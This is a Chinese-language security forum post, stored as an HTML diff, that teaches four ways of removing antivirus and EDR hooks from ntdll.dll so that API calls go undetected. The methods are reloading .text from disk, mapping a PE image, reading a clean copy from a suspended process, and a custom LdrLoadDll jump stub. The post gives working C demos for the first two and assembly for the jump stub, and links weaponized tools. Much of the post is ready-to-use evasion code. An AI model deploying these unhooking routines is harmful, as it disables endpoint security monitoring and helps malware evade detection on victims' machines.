@@ -1,0 +1,210 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>了解过免杀的都知道，杀软会对敏感 api 进行 hook 操作，而我们通常有两种方式进行解决，syscall 和 unhook，而我们在 syscall 的时候有时候会导致堆栈不完整，在杀软看来是一些异常的行为，比如下图可以看到 RIP 指针直接已经在 Program 里面了，</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090120-00ef1134-fc56-1.png"/></p>
+<p>（正常的情况如下图所示：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090143-0e34fd54-fc56-1.png"/></p>
+<p>）<br/>
+而我们在 unhook 时就完全不需要这种考虑，因为我们用的是一段新的 ntdll 或者其他 dll 的内存，调用的发出在杀软看起来是合理的，接下来我们一起来学习一下。</p>
+<h2 data-content="1" id="1ab69a7f70050921e83efc352ec48d87">从磁盘重载 ntdll</h2>
+<p>原理图如下：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090159-18397afa-fc56-1.png"/></p>
+<p>可以看出来，其实就是从磁盘上 clean 的 ntdll 的.text 端覆盖内存中被 hook 的ntdll 的.text 端。<br/>
+我们 unhook 的流程如下，如果对 pe 文件结构有了解的话会看的比较轻松。</p>
+<ol>
+<li>将 ntdll.dll 的新副本从磁盘映射到进程内存</li>
+<li>查找被 hook 的 ntdll.dll的 .text 部分的虚拟地址<ol>
+<li>获取ntdll.dll基址</li>
+<li>模块基址 + 模块的 .text 段 VirtualAddress</li>
+</ol>
+</li>
+<li>查找新映射ntdll.dll的 .text 段的虚拟地址</li>
+<li>获取被 hook 的 ntdll .text 段的内存写的权限</li>
+<li>将新映射的ntdll.dll的 .text 段覆盖到被 hook 的 ntdll 的 .text 部分</li>
+<li>还原之前被 hook 的 ntdll .text 段的内存被原本的内存权限</li>
+</ol>
+<p>下面是一个简单的 demo：</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">"pch.h"</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">HANDLE</span> <span class="n">process</span> <span class="o">=</span> <span class="n">GetCurrentProcess</span><span class="p">();</span>
+    <span class="n">MODULEINFO</span> <span class="n">mi</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">HMODULE</span> <span class="n">ntdllModule</span> <span class="o">=</span> <span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">);</span>
+
+    <span class="n">GetModuleInformation</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">ntdllModule</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mi</span><span class="p">));</span>
+    <span class="n">LPVOID</span> <span class="n">ntdllBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">mi</span><span class="p">.</span><span class="n">lpBaseOfDll</span><span class="p">;</span>
+    <span class="n">HANDLE</span> <span class="n">ntdllFile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">"c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">ntdll.dll"</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">HANDLE</span> <span class="n">ntdllMapping</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">ntdllFile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_READONLY</span> <span class="o">|</span> <span class="n">SEC_IMAGE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">LPVOID</span> <span class="n">ntdllMappingAddress</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">ntdllMapping</span><span class="p">,</span> <span class="n">FILE_MAP_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">hookedDosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">ntdllBase</span><span class="p">;</span>
+    <span class="n">PIMAGE_NT_HEADERS</span> <span class="n">hookedNtHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">ntdllBase</span> <span class="o">+</span> <span class="n">hookedDosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">WORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">hookedNtHeader</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">hookedSectionHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_SECTION_HEADER</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">IMAGE_FIRST_SECTION</span><span class="p">(</span><span class="n">hookedNtHeader</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">IMAGE_SIZEOF_SECTION_HEADER</span> <span class="o">*</span> <span class="n">i</span><span class="p">));</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">hookedSectionHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="s">".text"</span><span class="p">))</span> <span class="p">{</span>
+            <span class="n">DWORD</span> <span class="n">oldProtection</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="kt">bool</span> <span class="n">isProtected</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">ntdllBase</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">hookedSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="n">hookedSectionHeader</span><span class="o">-&gt;</span><span class="n">Misc</span><span class="p">.</span><span class="n">VirtualSize</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtection</span><span class="p">);</span>
+            <span class="n">memcpy</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">ntdllBase</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">hookedSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">ntdllMappingAddress</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">hookedSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="n">hookedSectionHeader</span><span class="o">-&gt;</span><span class="n">Misc</span><span class="p">.</span><span class="n">VirtualSize</span><span class="p">);</span>
+            <span class="n">isProtected</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">((</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">ntdllBase</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">hookedSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span> <span class="n">hookedSectionHeader</span><span class="o">-&gt;</span><span class="n">Misc</span><span class="p">.</span><span class="n">VirtualSize</span><span class="p">,</span> <span class="n">oldProtection</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtection</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">ntdllFile</span><span class="p">);</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">ntdllMapping</span><span class="p">);</span>
+    <span class="n">FreeLibrary</span><span class="p">(</span><span class="n">ntdllModule</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>这种方式是最简单的并且理论上可以对所有的 dll 进行 hook，但是缺点是需要读取磁盘上的 dll，而如果杀软对读取系统 dll 的行为进行了监控，那么我们这种方式其实是不好使的。</p>
+<h2 data-content="1" id="97752a1116ef61b40f6de910a607e0d3">PE 文件映射绕过 hook</h2>
+<p>这个思路是在<a href="https://idiotc4t.com/defense-evasion/load-ntdll-too" target="_blank">https://idiotc4t.com/defense-evasion/load-ntdll-too</a> 学到的，当我们通过CreateFileMapping，MapViewOfFile 等 api 进行文件映射时，果被打开文件是 PE格式，那么这个文件会按照内存展开，那么我们猜想是不是这个被第二次载入内存的ntdll是不是就是一个干净的ntdll，能不能帮助我们绕过一些 hook。<br/>
+demo 如下：</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+
+<span class="cp">#define DEREF( name )*(UINT_PTR *)(name)</span>
+<span class="cp">#define DEREF_64( name )*(DWORD64 *)(name)</span>
+<span class="cp">#define DEREF_32( name )*(DWORD *)(name)</span>
+<span class="cp">#define DEREF_16( name )*(WORD *)(name)</span>
+<span class="cp">#define DEREF_8( name )*(BYTE *)(name)</span>
+
+<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">NTAPI</span><span class="o">*</span> <span class="n">pNtAllocateVirtualMemory</span><span class="p">)(</span>
+    <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
+    <span class="n">PVOID</span><span class="o">*</span> <span class="n">BaseAddress</span><span class="p">,</span>
+    <span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
+    <span class="n">PSIZE_T</span> <span class="n">RegionSize</span><span class="p">,</span>
+    <span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span>
+    <span class="n">ULONG</span> <span class="n">Protect</span><span class="p">);</span>
+
+<span class="n">FARPROC</span> <span class="n">WINAPI</span> <span class="nf">GetProcAddressR</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">LPCSTR</span> <span class="n">lpProcName</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">UINT_PTR</span> <span class="n">uiLibraryAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">FARPROC</span> <span class="n">fpResult</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">hModule</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">uiLibraryAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">UINT_PTR</span><span class="p">)</span><span class="n">hModule</span><span class="p">;</span>
+
+    <span class="kr">__try</span>
+    <span class="p">{</span>
+        <span class="n">UINT_PTR</span> <span class="n">uiAddressArray</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">UINT_PTR</span> <span class="n">uiNameArray</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">UINT_PTR</span> <span class="n">uiNameOrdinals</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">PIMAGE_NT_HEADERS</span> <span class="n">pNtHeaders</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">pDataDirectory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pExportDirectory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="n">pNtHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)(</span><span class="n">uiLibraryAddress</span> <span class="o">+</span> <span class="p">((</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">uiLibraryAddress</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
+        <span class="n">pDataDirectory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DATA_DIRECTORY</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">];</span>
+        <span class="n">pExportDirectory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)(</span><span class="n">uiLibraryAddress</span> <span class="o">+</span> <span class="n">pDataDirectory</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">);</span>
+        <span class="n">uiAddressArray</span> <span class="o">=</span> <span class="p">(</span><span class="n">uiLibraryAddress</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span><span class="p">);</span>
+        <span class="n">uiNameArray</span> <span class="o">=</span> <span class="p">(</span><span class="n">uiLibraryAddress</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span><span class="p">);</span>
+        <span class="n">uiNameOrdinals</span> <span class="o">=</span> <span class="p">(</span><span class="n">uiLibraryAddress</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">lpProcName</span> <span class="o">&amp;</span> <span class="mh">0xFFFF0000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00000000</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">uiAddressArray</span> <span class="o">+=</span> <span class="p">((</span><span class="n">IMAGE_ORDINAL</span><span class="p">((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">lpProcName</span><span class="p">)</span> <span class="o">-</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">Base</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">));</span>
+            <span class="n">fpResult</span> <span class="o">=</span> <span class="p">(</span><span class="n">FARPROC</span><span class="p">)(</span><span class="n">uiLibraryAddress</span> <span class="o">+</span> <span class="n">DEREF_32</span><span class="p">(</span><span class="n">uiAddressArray</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="n">DWORD</span> <span class="n">dwCounter</span> <span class="o">=</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span><span class="p">;</span>
+            <span class="k">while</span> <span class="p">(</span><span class="n">dwCounter</span><span class="o">--</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="kt">char</span><span class="o">*</span> <span class="n">cpExportedFunctionName</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">uiLibraryAddress</span> <span class="o">+</span> <span class="n">DEREF_32</span><span class="p">(</span><span class="n">uiNameArray</span><span class="p">));</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">cpExportedFunctionName</span><span class="p">,</span> <span class="n">lpProcName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+                <span class="p">{</span>
+                    <span class="n">uiAddressArray</span> <span class="o">+=</span> <span class="p">(</span><span class="n">DEREF_16</span><span class="p">(</span><span class="n">uiNameOrdinals</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">));</span>
+                    <span class="n">fpResult</span> <span class="o">=</span> <span class="p">(</span><span class="n">FARPROC</span><span class="p">)(</span><span class="n">uiLibraryAddress</span> <span class="o">+</span> <span class="n">DEREF_32</span><span class="p">(</span><span class="n">uiAddressArray</span><span class="p">));</span>
+
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="n">uiNameArray</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">);</span>
+                <span class="n">uiNameOrdinals</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WORD</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="kr">__except</span> <span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fpResult</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">fpResult</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+
+    <span class="n">HANDLE</span> <span class="n">hNtdllfile</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="s">"c:</span><span class="se">\\</span><span class="s">windows</span><span class="se">\\</span><span class="s">system32</span><span class="se">\\</span><span class="s">ntdll.dll"</span><span class="p">,</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="n">FILE_SHARE_READ</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">HANDLE</span> <span class="n">hNtdllMapping</span> <span class="o">=</span> <span class="n">CreateFileMapping</span><span class="p">(</span><span class="n">hNtdllfile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_READONLY</span> <span class="o">|</span> <span class="n">SEC_IMAGE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">LPVOID</span> <span class="n">lpNtdllmaping</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hNtdllMapping</span><span class="p">,</span> <span class="n">FILE_MAP_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">pNtAllocateVirtualMemory</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtAllocateVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddressR</span><span class="p">((</span><span class="n">HMODULE</span><span class="p">)</span><span class="n">lpNtdllmaping</span><span class="p">,</span> <span class="s">"NtAllocateVirtualMemory"</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="n">GetLastError</span><span class="p">();</span>
+
+    <span class="n">LPVOID</span> <span class="n">Address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">SIZE_T</span> <span class="n">uSize</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
+
+    <span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">NtAllocateVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">Address</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+
+
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">};</span>
+</pre></div>
+<p>这种方式需要使用CreateFileMapping，MapViewOfFile 等 api 进行文件映射，此类 api 也会被杀软关注，并且我们无法保证打开哪些文件才可以获得干净的 ntdll，因此感觉这个方式的实战价值不算很高。</p>
+<h2 data-content="1" id="60dd04d1f6441a0f673c384eb3f99697">通过创建挂起的进程来获得干净的 ntdll</h2>
+<h3 data-content="1" id="82ed3ac7975a2ebcf1652a426b90a7f6">前置条件</h3>
+<p>我们都知道，每个进程的内存里都会加载各种各样的 dll，每个程序不同，其加载的 dll 也都不同，但是每个进程都应该加载Kernel32.dll、Kernelbase.dll 和 Ntdll.dll 等，因为这些 DLL 包含进程与操作系统交互所需的低级指令和 API 调用。而我们发现，在同一个系统上的两个进程在相同基地址处加载了相同的系统 DLL。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090304-3e8ffad0-fc56-1.png"/></p>
+<p>并且系统 dll 的每个模块也被加载到了相同的地址</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090319-47b30c88-fc56-1.png"/></p>
+<h3 data-content="1" id="1a78b7b81013f6413642e1c04c7e57e2">原理</h3>
+<p>我们来看一下当我们程序在加载的时候，edr 的 dll 和系统 dll 被一起加载进来</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090335-516a37a6-fc56-1.png"/></p>
+<p>此时，我们的进程是挂起的，我们去看一些 Nt 函数时，会发现他们还没有被 hook</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090349-59a2564c-fc56-1.png"/></p>
+<p>而当我们恢复挂起的进程之后，可以发现 Nt 函数此时被 hook 了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090406-63d07e96-fc56-1.png"/></p>
+<p>此时我们可以确定两件事情：</p>
+<ul>
+<li>新挂起进程的内存是干净的，没有被 hook 的</li>
+<li>所有的系统 dll 在被加载时的内存空间都是一样的</li>
+</ul>
+<p>所以我们接下来要做的事情就是想办法从干净的内存读取 ntdll 并且覆盖到当前进程被 hook 的内存空间。<br/>
+我们可以用 ReadProcessMemory 这个 api 来读取其他进程的内存，我们先提前计算好 ntdll 在内存空间中的位置，然后直接去读取就可以了，demo 代码可以看 <a href="https://github.com/dosxuz/PerunsFart" target="_blank">https://github.com/dosxuz/PerunsFart</a>，并且 github 有一个应用此技术武器化的工具：<a href="https://github.com/optiv/Freeze" target="_blank">https://github.com/optiv/Freeze</a></p>
+<h2 data-content="1" id="cd1cc736c7909988738ba5f4a2bb7902">通过自定义的跳转函数进行 unhook</h2>
+<p>我们都知道加载 dll 的函数是 LoadLibrary,这个函数在 kernel32.dll 里面，然而这个函数在 ntdll 里面对应的函数时 LdrLoadDLL，而我们这个方法的主角就是 LdrLoadDLL。<br/>
+在 x64 平台下，我们去查看这个函数的汇编指令</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090422-6d5141a8-fc56-1.png"/></p>
+<p>而我们就可以自实现一个函数，汇编如下：<br/>
+其中第一条指令时 LdrLoadDLL 的第一条指令，我们自己实现，防止此条指令被 hook，变成 jmp 指令。<br/>
+address 就是内存中 LdrLoadDLL 第二条指令的位置，在 x64 下就是 address(LdrLoadDLL)+5</p>
+<pre><code>mov qword ptr[rsp + 10h]  //原始的LdrLoadDll中汇编，使用我们自己的防止被hook
+    mov r11,address     //address(LdrLoadDLL)+5
+    jmp rll
+    ret</code></pre>
+<p>这里附上一张我在 vs 调试时的反汇编，我们只需要将这些字节起来放到一起就可以了。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090436-75dbea94-fc56-1.png"/></p>
+<p>首先先完成了LdrLoadDLL 的第一条指令，然后将address(LdrLoadDLL)+5 放到 r11 寄存器中，然后我们直接 jmp r11 就可以了，因为 r11 里面的地址就是LdrLoadDLL 第二条指令的地址，我们这样做也是避免了LdrLoadDLL 被 hook，第一条指令变成 jmp edr.address。<br/>
+并且我们这样做所有的函数发出都是从 ntdll 里面发出的，如图：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240417090449-7d5a8794-fc56-1.png"/></p>
+<p>这样我们就自己实现了一个跳转函数，demo 代码可以参考<br/>
+<a href="https://github.com/trickster0/LdrLoadDll-Unhooking" target="_blank">https://github.com/trickster0/LdrLoadDll-Unhooking</a>，原作者只提供了 x64 下的代码，我自己稍微改了一下兼容 x64 和 x86 ，地址：<a href="https://github.com/fdx-xdf/LdrLoadDll-Unhooking-x86-x64/blob/main/unhook.cpp" target="_blank">https://github.com/fdx-xdf/LdrLoadDll-Unhooking-x86-x64/</a><br/>
+详细的分析过程可以参考：<a href="https://killer.wtf/2022/01/19/CustomJmpUnhook.html" target="_blank">https://killer.wtf/2022/01/19/CustomJmpUnhook.html</a></p>
+<h2 data-content="1" id="fd7748414b2eae03d71c55f2fc1097f1">参考文章：</h2>
+<p><a href="https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++" target="_blank">https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++</a><br/>
+<a href="https://idiotc4t.com/defense-evasion/load-ntdll-too" target="_blank">https://idiotc4t.com/defense-evasion/load-ntdll-too</a><br/>
+<a href="https://www.optiv.com/insights/source-zero/blog/sacrificing-suspended-processes" target="_blank">https://www.optiv.com/insights/source-zero/blog/sacrificing-suspended-processes</a><br/>
+<a href="https://dosxuz.gitlab.io/post/perunsfart/" target="_blank">https://dosxuz.gitlab.io/post/perunsfart/</a><br/>
+<a href="https://killer.wtf/2022/01/19/CustomJmpUnhook.html" target="_blank">https://killer.wtf/2022/01/19/CustomJmpUnhook.html</a></p>
+</div>
+</div>
